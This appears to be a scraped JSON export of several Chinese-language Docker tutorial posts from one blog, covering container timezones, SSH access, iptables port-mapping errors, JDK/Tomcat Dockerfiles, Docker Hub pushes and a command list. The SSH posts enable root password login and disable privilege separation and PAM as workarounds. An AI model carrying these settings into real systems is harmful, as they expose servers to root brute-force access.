/usr/share/zoneinfo/Asia/Shanghai /etc/localtime RUN cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 参考：Docker 运行的容器时间不对，怎么解决! ENV TZ=Asia/Shanghai RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime &amp;&amp; echo $TZ &gt; /etc/timezone 参考：Docker容器时间同步问题 修改完成以后发现还是有问题。 123[root@fb2ae4dce587 logs]# hwclockhwclock: Cannot access the Hardware Clock via any known method.hwclock: Use the --debug option to see the details of our search for an access method. 我参考这篇文章做了修改。 调整时间 把时区设置加入到Dockerfile中 这里我修改：cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 1234567# UbuntuRUN echo \"Asia/shanghai\" &gt; /etc/timezone;# CentOSRUN cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"Docker学习(十二) SSH远程登陆docker容器","slug":"容器-虚拟化/Docker/Docker学习(十二) SSH远程登陆docker容器","date":"2016-07-18T04:33:03.000Z","updated":"2017-03-14T05:46:30.000Z","comments":true,"path":"2016/07/18/容器-虚拟化/Docker/Docker学习(十二) SSH远程登陆docker容器/","link":"","permalink":"http://blog.yangcvo.me/2016/07/18/容器-虚拟化/Docker/Docker学习(十二) SSH远程登陆docker容器/","excerpt":"","text":"Docker学习(十二) SSH远程登陆docker容器环境：1CentOS release 6.8 (Final) 任务：1实现宿主机使用ssh登陆docker容器。方便后期使用Jenkins访问docker. 1、用户密码认证方式登陆//第一步：运行容器，指定IP，这里的示例容器开启的SSH服务，后面拿它测试 //d第二步：进入容器。编辑ssh_config配置文件。 1234[root@docker1 ~]# docker run -itd -p 192.168.1.183:9999:22 yangc/centos6.8 /bin/basha3026d8da25d40214c470fc6d12638476c72774d70127a73069498c1397aac62[root@docker1 ~]# docker exec -it a3026d8da25d /bin/bash[root@a3026d8da25d ~]# vim /etc/ssh/ssh_config 编辑ssh_config配置文件。 123456789101112sshd_config 需要关注三个地方，未修改之前是这样：PermitRootLogin without-password#AuthorizedKeysFile %h/.ssh/authorized_keys#PasswordAuthentication yes说明：#PermitRootLogin yes #允许root用户以任何认证方式登录（用户名密码认证和公钥认证）#PermitRootLogin without-password #只允许root用公钥认证方式登录#PermitRootLogin no #不允许root用户以任何认证方式登录这里先修改两处：PermitRootLogin without-password 改为 PermitRootLogin yes#PasswordAuthentication yes 改为 PasswordAuthentication yes 编辑完重启服务。 123[root@a3026d8da25d ~]# service sshd restartStopping sshd: [ OK ]Starting sshd: [ OK ] 测试连接报错3个问题 1.这个是没有启动容器的sshd服务。 Docker容器使用静态独立的外部IP（便于集群组建） 12[root@docker1 ~]# ssh root@192.168.1.183 -p9999ssh: connect to host 192.168.1.183 port 9999: Connection refused 这个是没有启动容器的sshd服务。 2.测试连接，在Docker宿主机上SSH到第一个容器 ssh连接报错：Permission denied (publickey,gssapi-keyex,gssapi-with-mic). 12[root@docker1 ~]# ssh root@192.168.1.183 -p9999Permission denied (publickey,gssapi-keyex,gssapi-with-mic). 报了这个错，原因是修改了/etc/ssh/sshd_config 中的”PasswordAuthentication”参数值为”no”,修改回”yes”，重启sshd服务即可。 3.修改root密码报错。 /usr/share/cracklib/pw_dict.pwd: No such file or directory 12345[root@a3026d8da25d ~]# passwd rootChanging password for user root.New password:/usr/share/cracklib/pw_dict.pwd: No such file or directoryPWOpen: No such file or directory 这是因为缺少某些lib库。解决办法： yum reinstall -y cracklib-dicts 在重新试下： 12345[root@a3026d8da25d ~]# passwd rootChanging password for user root.New password:Retype new password:passwd: all authentication tokens updated successfully. ifconfig #获得docker的内网地址（inet addr）：172.17.0.2 两种连接方式：直接连接docker 内网地址，或者直接连接映射宿主机的地址加端口。 因为做了端口映射，所以可以直接从映射的端口登陆，只需要知道和docker的22端口映射的宿主机端口和宿主机的ip（如果和docker的22做端口映射时候采用默认IP方式，则默认宿主机的所有IP都和docker的22端口映射，这样localhost和子网IP均可等登陆） 123456789101112[root@docker1 ~]# ssh root@172.17.0.13The authenticity of host '172.17.0.13 (172.17.0.13)' can't be established.RSA key fingerprint is 8d:98:c5:71:11:b9:5f:47:f5:f6:25:7f:9c:53:91:9c.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '172.17.0.13' (RSA) to the list of known hosts.root@172.17.0.13's password:[root@a3026d8da25d ~]#[root@docker1 ~]# ssh root@192.168.1.183 -p9999root@192.168.1.183's password:Last login: Wed Oct 12 07:46:59 2016 from 172.17.0.1[root@a3026d8da25d ~]# 2、公钥认证方式登陆前面第一步份不变。只需要第二步做下修改：进入容器。编辑ssh_config配置文件。 1234567891011把第一步中提到的需要注意的三个地方做以下修改：PermitRootLogin without-password#AuthorizedKeysFile %h/.ssh/authorized_keys改为AuthorizedKeysFile %h/.ssh/authorized_keys#PasswordAuthentication yes改为PasswordAuthentication yes（如果服务器不在本地，千万不能PasswordAuthentication yes-&gt;no，万一当前的ssh链接中断，万一RAS认证没弄好，密码验证又禁止了。可以理解为公钥认证优先于用户密码认证，但是万一公钥认证失败，用用户密码认证以防万一） 1234567891011 [root@docker1 ~]# ssh-keygen -t rsa#一直回车，生成宿主机的密钥[root@docker1 ~]# ssh-copy-id root@172.17.0.13/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keysroot@172.17.0.13's password:Number of key(s) added: 1Now try logging into the machine, with: \"ssh 'root@172.17.0.13'\"and check to make sure that only the key(s) you wanted were added. 测试登陆 123[root@docker1 ~]# ssh root@192.168.1.183 -p9999Last login: Wed Oct 12 07:57:47 2016 from 192.168.1.183[root@a3026d8da25d ~]# **可以替换上面的通过scp方法把公钥传送到docker* #或者直接把宿主机的id_rsa.pub内容复制到docker的/root/.ssh/authorized_keys 课外资料： ubuntu环境ssh远程登录docker外部访问容器","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"Docker学习(十三) SSH远程登陆docker容器","slug":"容器-虚拟化/Docker/ Docker虚拟容器ssh登录问题解决方法","date":"2016-07-18T04:33:03.000Z","updated":"2017-03-14T05:46:32.000Z","comments":true,"path":"2016/07/18/容器-虚拟化/Docker/ Docker虚拟容器ssh登录问题解决方法/","link":"","permalink":"http://blog.yangcvo.me/2016/07/18/容器-虚拟化/Docker/ Docker虚拟容器ssh登录问题解决方法/","excerpt":"","text":"Docker虚拟容器ssh登录问题解决方法虽然CentOS 6/7 的容器启动以后都没有安装sshd，我单独通过yum安装了服务并且启动，非常奇怪的是，其他客户端尝试连接都被reset连接: ssh root@192.168.1.3 Read from socket failed: Connection reset by peer 使用debug方式连接容器: ssh -vvv 192.168.1.3 显示如下: 12345678910111213141516171819202122OpenSSH_6.0p1 Debian-4, OpenSSL 1.0.1e 11 Feb 2013debug1: Reading configuration data /etc/ssh/ssh_configdebug1: /etc/ssh/ssh_config line 19: Applying options for *debug2: ssh_connect: needpriv 0debug1: Connecting to 192.168.1.3 [192.168.1.3] port 22.debug1: Connection established.debug1: permanently_set_uid: 0/0debug1: identity file /root/.ssh/id_rsa type -1debug1: identity file /root/.ssh/id_rsa-cert type -1debug1: identity file /root/.ssh/id_dsa type -1debug1: identity file /root/.ssh/id_dsa-cert type -1debug1: identity file /root/.ssh/id_ecdsa type -1debug1: identity file /root/.ssh/id_ecdsa-cert type -1debug1: Remote protocol version 2.0, remote software version OpenSSH_5.3debug1: match: OpenSSH_5.3 pat OpenSSH_5*debug1: Enabling compatibility mode for protocol 2.0debug1: Local version string SSH-2.0-OpenSSH_6.0p1 Debian-4debug2: fd 3 setting O_NONBLOCKdebug3: load_hostkeys: loading entries for host \"192.168.1.3\" from file \"/root/.ssh/known_hosts\"debug3: load_hostkeys: loaded 0 keysdebug1: SSH2_MSG_KEXINIT sentConnection closed by 192.168.1.3 这个问题通常是由于服务器端的权限问题导致，例如 .ssh 目录属性没有设置成 700 等。由于默认没有安装 rsyslog ，所以我单独安装了rsyslog以后，再重启了一次 sshd服务，然后使用客户端ssh -vvv SERVERIP 则可以看到 /var/log/secure日志中显示: Sep 8 10:36:39 e7674eb07c3d sshd[225]: fatal: chroot(&quot;/var/empty/sshd&quot;): Operation not permitted 这个问题在 connect via ssh to jhipster docker container on CentOS 7 提供了解决方法： 对于 centos 7 采用的是比较陈旧的版本（当前0.11.1-22.el7），所以是: 12sed 's/UsePrivilegeSeparation yes/UsePrivilegeSeparation no/' -i /etc/ssh/sshd_config/usr/sbin/sshd 不过，我发现这样的情况下，在 centos 7 容器中显示的ssh进程比较奇怪: 12root 265 1 0 11:10 ? 00:00:00 /usr/sbin/sshdroot 267 265 0 11:10 ? 00:00:00 sshd: root@notty 客户端长时间等待，然后出现报错 PTY allocation request failed on channel 0测试过密钥认证和密码认证都这个问题。对于 centos 6 采用是比较新的版本，需要修改 /etc/ssh/sshd_config 的配置，取消掉 UsePAM 1sed 's/UsePAM yes/UsePAM no/' -i /etc/ssh/sshd_config 已验证，上述方法用于 docker 1.2 版本可以解决centos 6容器的ssh登录问题","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"Docker学习（十一）docker不能访问外网和报错docker/ Error response from daemon/ failed to create endpoint db01 on network bridge","slug":"容器-虚拟化/Docker/Docker学习（十一）故障处理docker: Error response from daemon: failed to create endpoint db01 on network bridge","date":"2016-07-17T11:33:03.000Z","updated":"2017-03-23T14:09:28.000Z","comments":true,"path":"2016/07/17/容器-虚拟化/Docker/Docker学习（十一）故障处理docker: Error response from daemon: failed to create endpoint db01 on network bridge/","link":"","permalink":"http://blog.yangcvo.me/2016/07/17/容器-虚拟化/Docker/Docker学习（十一）故障处理docker: Error response from daemon: failed to create endpoint db01 on network bridge/","excerpt":"","text":"问题来源： Docker不能访问外网开始是因为所有容器出现不能访问外网。只能访问宿主机的IP。可以ping通。这边我监控到服务全部挂了，还好是在测试环境。 早上还是好好的、后面一个同事把宿主机防火墙刷新了。之前生产这些容器映射好的端口都是临时的。没有直接写到iptables.导致重启iptables 丢失了所有的容器的规则。访问外网都失败了。 这个原因后面写好了规则重启防火墙就可以了。 ■ 访问不了外网前宿主机192.168.1.183 防火墙： 123456789101112131415161718192021[root@docker1 files]# iptables -nvLChain INPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 6942 836K ACCEPT all -- * * 0.0.0.0/0 0.0.0.0/0 state RELATED,ESTABLISHED 0 0 ACCEPT icmp -- * * 0.0.0.0/0 0.0.0.0/0 0 0 ACCEPT all -- lo * 0.0.0.0/0 0.0.0.0/0 0 0 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:22 52 3312 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 reject-with icmp-host-prohibitedChain FORWARD (policy ACCEPT 0 packets, 0 bytes)reject-with icmp-host-prohibitedChain OUTPUT (policy ACCEPT 857 packets, 256K bytes) pkts bytes target prot opt in out source destinationChain DOCKER (1 references) pkts bytes target prot opt in out source destinationChain DOCKER-ISOLATION (1 references) pkts bytes target prot opt in out source destination 3 156 RETURN all -- * * 0.0.0.0/0 0.0.0.0/0 ■ 第一时间把容器端口映射规则写在iptables配置文件里面重启防火墙好了。 123456789101112131415161718192021222324252627282930313233343536[root@docker1 files]# iptables -nvLChain INPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination13578 2796K ACCEPT all -- * * 0.0.0.0/0 0.0.0.0/0 state RELATED,ESTABLISHED 0 0 ACCEPT icmp -- * * 0.0.0.0/0 0.0.0.0/0 0 0 ACCEPT all -- lo * 0.0.0.0/0 0.0.0.0/0 0 0 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:22 155 9904 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 reject-with icmp-host-prohibitedChain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 25 2267 DOCKER-ISOLATION all -- * * 0.0.0.0/0 0.0.0.0/0 10 1232 DOCKER all -- * docker0 0.0.0.0/0 0.0.0.0/0 10 1232 ACCEPT all -- * docker0 0.0.0.0/0 0.0.0.0/0 ctstate RELATED,ESTABLISHED 15 1035 ACCEPT all -- docker0 !docker0 0.0.0.0/0 0.0.0.0/0 0 0 ACCEPT all -- docker0 docker0 0.0.0.0/0 0.0.0.0/0 1344 80600 REJECT all -- * * 0.0.0.0/0 0.0.0.0/0 reject-with icmp-host-prohibitedChain OUTPUT (policy ACCEPT 15 packets, 5460 bytes) pkts bytes target prot opt in out source destinationChain DOCKER (1 references) pkts bytes target prot opt in out source destination 0 0 ACCEPT tcp -- !docker0 docker0 0.0.0.0/0 172.17.0.2 tcp dpt:8080 0 0 ACCEPT tcp -- !docker0 docker0 0.0.0.0/0 172.17.0.3 tcp dpt:8080 0 0 ACCEPT tcp -- !docker0 docker0 0.0.0.0/0 172.17.0.4 tcp dpt:8080 0 0 ACCEPT tcp -- !docker0 docker0 0.0.0.0/0 172.17.0.5 tcp dpt:8080 0 0 ACCEPT tcp -- !docker0 docker0 0.0.0.0/0 172.17.0.6 tcp dpt:8080 0 0 ACCEPT tcp -- !docker0 docker0 0.0.0.0/0 172.17.0.7 tcp dpt:8080 0 0 ACCEPT tcp -- !docker0 docker0 0.0.0.0/0 172.17.0.8 tcp dpt:8080 0 0 ACCEPT tcp -- !docker0 docker0 0.0.0.0/0 172.17.0.9 tcp dpt:8080 0 0 ACCEPT tcp -- !docker0 docker0 0.0.0.0/0 172.17.0.10 tcp dpt:8080Chain DOCKER-ISOLATION (1 references) pkts bytes target prot opt in out source destination 25 2267 RETURN all -- * * 0.0.0.0/0 0.0.0.0/0 已经可以访问外网了。问题是防火墙的问题。还有就是容器的IP需要设置静态 这是前提。没有设置也有可能导致访问外网失败。 ###故障处理docker/ Error response from daemon/ failed to create endpoint db01 on network bridge 出现访问不了外网还可以这样。 123[root@docker1 ~]# docker run -itd -p 12001:8080 tomcat-account/centos /bin/bashfd4be15583f2081b4b28aa913fee1f6b0357ce61786a782e13dc30e27edd7743docker: Error response from daemon: failed to create endpoint sleepy_wing on network bridge: iptables failed: iptables --wait -t nat -A DOCKER -p tcp -d 0/0 --dport 12001 -j DNAT --to-destination 172.17.0.6:8080 ! -i docker0: iptables: No chain/target/match by that name. 这里我从新做了个容器。发现映射之前一模一样的端口就报错 网卡映射失败。 ■ 报错内容： 1docker: Error response from daemon: failed to create endpoint db01 on network bridge: COMMAND_FAILED: '/sbin/iptables -t nat -A DOCKER -p tcp -d 0/0 --dport 3306 -j DNAT --to-destination 172.17.0.2:3306 ! -i docker0' failed: iptables: No chain/target/match by that name.. ■ 解決方法 12# mv /var/lib/docker/network/files /tmp/docker-iptables-err# systemctl restart docker 备份之前的容器的网卡信息。重启docker /var/lib/docker/network/files 这个主要问题是存了之前通信信息。 然后重启了docker 以后。重启之前的跑服务的容器。会自动帮忙映射好之前设置的，防火墙规则也会临时暂时有效了。 12345[root@docker1 files]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES46979ea00dc6 tomcat-system/centos \"/bin/bash\" 2 days ago Up 2 minutes 0.0.0.0:10007-&gt;8080/tcp evil_knuthfb2ae4dce587 tomcat-account/centos \"/bin/bash\" 2 days ago Up 2 minutes 0.0.0.0:10001-&gt;8080/tcp angry_goldberg8b2ac488e454 tomcat-point/centos \"/bin/bash\" 2 days ago Up 19 minutes 0.0.0.0:10006-&gt;8080/tcp focused_hypatia 在重新生成容器就不会了。 12[root@docker1 ~]# docker run -itd -p 12001:8080 tomcat-account/centos /bin/bashfd4be15583f2081b4b28aa913fee1f6b0357ce61786a782e13dc30e27edd7743 可参考链接：docker/ Error response from daemon/ failed to create endpoint db01 on network bridge","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[]},{"title":"Docker学习(十)：部署jdk","slug":"容器-虚拟化/Docker/Docker学习(十)：部署jdk","date":"2016-07-17T03:33:03.000Z","updated":"2017-03-14T05:46:27.000Z","comments":true,"path":"2016/07/17/容器-虚拟化/Docker/Docker学习(十)：部署jdk/","link":"","permalink":"http://blog.yangcvo.me/2016/07/17/容器-虚拟化/Docker/Docker学习(十)：部署jdk/","excerpt":"","text":"Docker安装JDK安装JDK7和JDK8基本没有区别，只是Dockerfile有所不同，但是他们都继承了之前tools的Docker镜像，下面给出了JDK8和JDK8的Dockerfile源文件。 ####大概步骤： 1234上传jdk8到宿主机编写Dockerfile构建镜像编写supervisor配置文件build和run 12345# 方式一：可以通过ssh上传指定版本的jdk（这里选择第一种）# 1. 上传jdk7到宿主机# 2. 将jdk7都解压到指定的目录下（和Dockerfile文件同目录）# 方式二：从官网或者镜像网站下载jdk8 Dockerfile文件 12345678910111213141516171819202122232425############################################# version : yangc/jdk8# desc : 当前版本安装的jdk8############################################# 设置继承自我们创建的 tools 镜像FROM yangc/centos7.1# 下面是一些创建者的基本信息MAINTAINER birdben (yangcvo@gmail.com)# 设置环境变量，所有操作都是非交互式的ENV DEBIAN_FRONTEND noninteractive# 添加 supervisord 的配置文件，并复制配置文件到对应目录下面。（supervisord.conf文件和Dockerfile文件在同一路径）COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf# 设置 jdk 的环境变量，若读者有其他的环境变量需要设置，也可以在这里添加。ENV JAVA_HOME /srv/jdk8# 复制 jdk1.7.0_71 文件到镜像中（jdk1.7.0_71 文件夹要和Dockerfile文件在同一路径）ADD jdk1.8.0_65 /srv/jdk8# 执行supervisord来同时执行多个命令，使用 supervisord 的可执行路径启动服务。CMD [\"/usr/bin/supervisord\"] supervisor配置文件内容 123456789# 配置文件包含目录和进程# 第一段 supervsord 配置软件本身，使用 nodaemon 参数来运行。# 第二段包含要控制的 2 个服务。每一段包含一个服务的目录和启动这个服务的命令。[supervisord]nodaemon=true[program:sshd]command=/usr/sbin/sshd -D 控制台终端 1234# 构建镜像docker build -t=\"yangc/jdk7\" .# 执行已经构件好的镜像docker run -p 9999:22 -t -i yangc/jdk7 这里一般我都是把镜像都是初始化状态。第二：写脚本去安装部署服务在docker","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"Docker学习笔记(九)如何将docker镜像上传到docker.hub仓库","slug":"容器-虚拟化/Docker/ Docker学习笔记(九)如何将docker镜像上传到docker.hub仓库","date":"2016-07-16T03:33:03.000Z","updated":"2017-03-14T05:46:24.000Z","comments":true,"path":"2016/07/16/容器-虚拟化/Docker/ Docker学习笔记(九)如何将docker镜像上传到docker.hub仓库/","link":"","permalink":"http://blog.yangcvo.me/2016/07/16/容器-虚拟化/Docker/ Docker学习笔记(九)如何将docker镜像上传到docker.hub仓库/","excerpt":"","text":"Docker学习笔记(九)如何将docker镜像上传到docker.hub仓库第一步:先注册个docker账号吧.反正总要用到的. 点击这里注册账号 注册一个账号，例如yangc 我user ,并创建仓库. 提交/保存镜像创建好的镜像，可以保存到索引仓库中，便于下次使用（当然，我们直接共享Dockerfile，是最简单的事情，:)) ），但毕竟镜像可以做到开箱即用。 记住username，password，email.后面在命令行验证登陆的时候需要用到，再下来就是创建仓库了，本文假定你的英语还凑合可以看得懂英文：create ---&gt; create repository ,取个名字，这里我们最终创建的仓库名称：rual/ljw ，这个rual 是我的帐号，ljw是其中一个仓库名。 1.构建镜像 12345678910111213141516171819docker build -t=\"yangc/tomcat8\" .-t： 为构建的镜像制定一个标签，便于记忆/索引等. ： 指定Dockerfile文件在当前目录下网速不太好，会等待很长时间。很多操作可能需要科学上网，逼得我只能一直挂着VPN，方能畅通无阻。上面已经构建OK的话，可省略此步。#这里也可以导出某个容器。不是按脚本去跑的。这里自己配置好的容器。导出docker export 容器name &gt; tomcat8.tar#导入cat tomcat8.tar | docker import - yangc/tomcat8 2.docker hub 帐号在本地验证登陆 123456[root@docker ~]# docker loginUsername: yangcPassword:Email: yangcvo@gmail.comWARNING: login credentials saved in /root/.docker/config.jsonLogin Succeeded 3 docker push 镜像到docker hub 的仓库 1234567891011docker push提交到Docker索引仓库docker push yangc/tomcat8上传OK的话，可以得到类似地址：https://index.docker.io/u/yangc/tomcat8/4. 如何使用镜像docker pull yangc/tomcat8 剩下的步骤，就很简单了。不需要一一介绍。","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"Docker学习(八)：Docker搭建Tomcat运行环境","slug":"容器-虚拟化/Docker/Docker学习(八)：Docker搭建Tomcat运行环境","date":"2016-07-15T03:33:03.000Z","updated":"2017-03-14T05:46:21.000Z","comments":true,"path":"2016/07/15/容器-虚拟化/Docker/Docker学习(八)：Docker搭建Tomcat运行环境/","link":"","permalink":"http://blog.yangcvo.me/2016/07/15/容器-虚拟化/Docker/Docker学习(八)：Docker搭建Tomcat运行环境/","excerpt":"","text":"Docker搭建JAVA Tomcat运行环境前言Docker在提供一种应用程序的自动化部署解决方案，在 Linux 系统上迅速创建一个容器（轻量级虚拟机）并部署和运行应用程序，并通过配置文件可以轻松实现应用程序的自动化安装、部署和升级，非常方便。 因为使用了容器，所以可以很方便的把生产环境和开发环境分开，互不影响，这是 docker 最普遍的一个玩法。更多的玩法还有大规模 web 应用、数据库部署、持续部署、集群、测试环境、面向服务的云计算、虚拟桌面 VDI 等等。 docker部署tomcat第一： 可以隔离每个tomcat服务单独跑。 这样资源可以很好的利用。第二： 后期用jenkins结合docker部署tomcat。 非常方便。第三： tomcat重点服务扩容迁移也很方便。只需要生成镜像在其他的虚拟机上面跑就行。 部署tomcat环境这里是使用KVM 虚拟的4G内存的centos 7.1 x64位系统 ，也可以使用ubuntu-13.10以上 安装docker这个也写过文档，多种linux系统安装docker .这里不详细讲解。 这里安装的Tomcat继承了之前JDK7的Docker镜像，因为运行Tomcat需要依赖JDK。 大概步骤： 上传Tomcat/8.0.32到宿主机 编写Dockerfile构建镜像 编写supervisor配置文件 build和run 1234567# 方式一：可以通过ssh上传指定版本的tomcat（这里选择第一种）# 1. 上传tomcat7到宿主机# 2. 将tomcat7都解压到指定的目录下（和Dockerfile文件同目录）# 方式二：从官网或者镜像网站下载Tomcat/8.0.32# 方法三： 从官网下载好scp到docker tomcat容器指定目录 Dockerfile文件 123456789101112131415161718192021222324252627282930############################################# version : centos/Tomcat/8.0.32# desc : 当前版本安装的Tomcat/8.0.32############################################# 设置继承自我们创建的 jdk8 镜像FROM yangc/jdk8# 下面是一些创建者的基本信息MAINTAINER birdben (yangcvo@gmail.com)# 设置环境变量，所有操作都是非交互式的ENV DEBIAN_FRONTEND noninteractive# 添加 supervisord 的配置文件，并复制配置文件到对应目录下面。（supervisord.conf文件和Dockerfile文件在同一路径）COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf# 设置 tomcat 的环境变量，若读者有其他的环境变量需要设置，也可以在这里添加。ENV CATALINA_HOME /srv/tomcat/tomcat# 复制 apache-tomcat-8.0.32 文件到镜像中（apache-tomcat-8.0.32 文件夹要和Dockerfile文件在同一路径）ADD apache-tomcat-8.0.32 /srv/tomcat/tomcat# 容器需要开放Tomcat 8080端口EXPOSE 8080# 容器需要开放SSH 22端口EXPOSE 22# 执行supervisord来同时执行多个命令，使用 supervisord 的可执行路径启动服务。CMD [\"/usr/bin/supervisord\"] Dockerfile源文件链接：dockerfile-tomcat supervisor配置文件内容123456789101112# 配置文件包含目录和进程# 第一段 supervsord 配置软件本身，使用 nodaemon 参数来运行。# 第二段包含要控制的 2 个服务。每一段包含一个服务的目录和启动这个服务的命令。[supervisord]nodaemon=true[program:sshd]command=/usr/sbin/sshd -D[program:tomcat]command=/bin/bash -c \"exec $&#123;CATALINA_HOME&#125;/bin/catalina.sh run\" 运行：脚本写好了，需要转换成镜像： 123456789101112131415161718192021222324# 构建镜像docker build -t=\"yangc/tomcat8\" .-t： 为构建的镜像制定一个标签，便于记忆/索引等. ： 指定Dockerfile文件在当前目录下网速不太好，会等待很长时间。很多操作可能需要科学上网，逼得我只能一直挂着VPN，方能畅通无阻。构建镜像完成之后，看看运行效果：# 执行已经构件好的镜像docker run -p 9999:22 -p 10001:8080 -t -i yangc/tomcat8#这里也可以导出某个容器。不是按脚本去跑的。这里自己配置好的容器。导出docker export 容器name &gt; tomcat8.tar#导入cat tomcat8.tar | docker import - yangc/tomcat8 在运行命令中，还得需要显式指定 -p 22 -p 8080:8080，否则在Docker 0.8.1版本中不会主动映射到宿主机上。据悉在Docker 0.4.8版本时，就不担心这个问题。 或者，您要有好的方式，不妨告知于我，谢谢。 在Dockerfile中，若没有使用ENTRYPOINT/CMD指令，若运行多个命令，可以这样做： docker run -d -p 22 -p 8080 yangc/tomcat8 /bin/sh -c &quot;service tomcat start &amp;&amp; /usr/sbin/sshd -D&quot; 浏览器访问: http://虚拟机IP:10001/","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"Docker学习(七)：Docker命令总结学习积累经验","slug":"容器-虚拟化/Docker/Docker学习(七)：Docker命令总结学习积累经验","date":"2016-07-14T06:41:03.000Z","updated":"2017-03-14T05:46:18.000Z","comments":true,"path":"2016/07/14/容器-虚拟化/Docker/Docker学习(七)：Docker命令总结学习积累经验/","link":"","permalink":"http://blog.yangcvo.me/2016/07/14/容器-虚拟化/Docker/Docker学习(七)：Docker命令总结学习积累经验/","excerpt":"","text":"Docker总结学习积累经验：现在对Docker这个运行的原理以及命令都已经非常清楚，因为自己整理了很多Docker基本命令，已经需要注意都刻意标注： 谈谈学习Docker心得体会： 14年就开始接触，后面docker只是知道是容器类似vm虚拟机一样，就是在虚拟机里面跑单独隔离的服务，这是那时候的单面了解，后面学KVM用的感觉还不错，后面VM就慢慢的不再使用，因为针对KVM也深入去学习了。开始学习docker，openstack服务器云平台。 在前面学习6篇文章，是我本人自己总结的学习经验。 下面整理centos 系统操作命令： 1234567891011121314151617181920212223242526272829303132yum -y remove docker 先卸载之前的包yum install docker-io 安装service docker start 启动服务chkconfig docker on 开机启动docker pull centos 网上下载centos镜像。docker version docker查看版本docker -help docker查看帮助命令docker images centos docker查看centos镜像docker run -i -t centos:latest /bin/bash 启动一个新的容器。后面latest是版本名称docker ps 列出容器docker ps -l 列出前台在运行的镜像容器docker ps -a 查看所有在运行和没有运行的镜像容器docker logs 显示容器的标准输出docker stop 停止正在运行的容器docker restart 容器终止然后重新启动它。docker run -i -t 启动运行容器。docker run -i -t -d 让容器后台运行程序。docker attach sad_shaw 进入到指定容器。**非常方便**docker exec -it eafd9111ada6 /bin/bash # 进入容器docker export sad_shaw &gt; /root/centos.tar 镜像导出到服务器指定目录。没有指定绝对目录默认当前目录。docker export sad_shaw &gt; centos.tar sad_shaw 镜像到处-到处为centos.tarcat centos.tar | docker import - test/centos 这里是把centos.tar导入到新的镜像命名为/test/centosdocker rm sad_shaw 删除容器sad_shawdocker rm -f sad_shaw 删除运行中的容器sad_shawdocker rm $(docker ps -a -q) 清理所有处于停止的容器docker rmi &lt;image id&gt; 删除images，通过image的id来指定删除谁docker rmi $(docker images -q) 删除全部imagedocker rmi $(docker images | grep \"^&lt;none&gt;\" | awk \"&#123;print $3&#125;\") 想要删除untagged images，也就是那些id为的image的话可以用。 Docker下载centos虚拟机 docker pull docker.io/jdeathe/centos-ssh 启动虚拟机 docker run -i -t docker.io/jdeathe/centos-ssh /bin/bash","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"Docker学习(六)：部署nginx","slug":"容器-虚拟化/Docker/Docker学习(六)：部署nginx","date":"2016-07-13T10:43:07.000Z","updated":"2017-03-14T05:46:47.000Z","comments":true,"path":"2016/07/13/容器-虚拟化/Docker/Docker学习(六)：部署nginx/","link":"","permalink":"http://blog.yangcvo.me/2016/07/13/容器-虚拟化/Docker/Docker学习(六)：部署nginx/","excerpt":"","text":"我14年就开始接触了docker，因为那时候因为docker还不是很成熟，在测试环境上面使用也没有大大推出，经过这一两年docker容器也很受我们运维人员喜爱特别好的利器。 现在普遍都会在测试环境使用甚至在生产环境也用docker使用集群，之前搞过CDN云加速，环境部署也有在centos7.1最新系统环境部署。因为docker容器要求也比较高。 可以在我前面docker简介和docker安装都有提到这一点。 1、镜像环境说明 1.1、镜像版本说明 操作系统:Centos 6.5 64 位 docker 运行环境(CentOS Linux release 7.2.1511 (Core) 64 位 | docker) 镜像版本 V1.0 软件明细: docker-1.10.3 1.2、镜像安装说明 